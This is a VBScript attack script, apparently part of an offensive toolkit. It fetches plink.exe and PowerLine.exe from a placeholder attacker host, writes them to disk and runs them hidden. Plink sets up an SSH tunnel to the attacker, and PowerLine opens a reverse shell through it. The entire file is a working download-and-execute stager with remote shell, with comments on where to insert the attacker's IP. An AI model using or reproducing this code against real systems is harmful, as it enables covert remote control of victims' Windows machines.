Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
if Not fso.FileExists("plink.exe") Then
	Dim strUrl, StrFile
	' You will need to update strUrl with the attackers IP
	strUrl = "http://<attadkers IP>/plink.exe"
	StrFile = "plink.exe"
	Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 
	Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 
	Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 
	Const HTTPREQUEST_PROXYSETTING_PROXY = 2 
	Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts 
	Err.Clear 
	Set http = Nothing 
	Set http = CreateObject("WinHttp.WinHttpRequest.5.1") 
	If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") 
	If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") 
	If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") 
	http.Open "GET", strURL, False 
	http.Send 
	varByteArray = http.ResponseBody 
	Set http = Nothing 
	Set fs = CreateObject("Scripting.FileSystemObject") 
	Set ts = fs.CreateTextFile(StrFile, True) 
	strData = "" 
	strBuffer = "" 
	For lngCounter = 0 to UBound(varByteArray) 
		ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) 
	Next 
	ts.Close 
End If
Dim oShell
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
' You will need to update -hostip with the attackers IP
strArgs = "plink.exe -N -batch -hostkey <attackers hostkey> -l test -pw testpassword <attackers IP> -L 127.0.0.1:5379:<attackers IP>:5379"""
oShell.Run strArgs, 0, false
if Not fso.FileExists("PowerLine.exe") Then
	' You will need to update strUrl with the attackers IP
	strUrl = "http://<attackers IP>/PowerLine.exe"
	StrFile = "PowerLine.exe"
	Err.Clear 
	Set http = Nothing 
	Set http = CreateObject("WinHttp.WinHttpRequest.5.1") 
	If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") 
	If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") 
	If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") 
	http.Open "GET", strURL, False 
	http.Send 
	varByteArray = http.ResponseBody 
	Set http = Nothing 
	Set fs = CreateObject("Scripting.FileSystemObject") 
	Set ts = fs.CreateTextFile(StrFile, True) 
	strData = "" 
	strBuffer = "" 
	For lngCounter = 0 to UBound(varByteArray) 
		ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) 
	Next 
	ts.Close 
End If
' You will need to -hostip with the attackers IP
strArgs = "PowerLine.exe revshell ""revshell -hostip 127.0.0.1 -port 5379"""
oShell.Run strArgs, 0, false

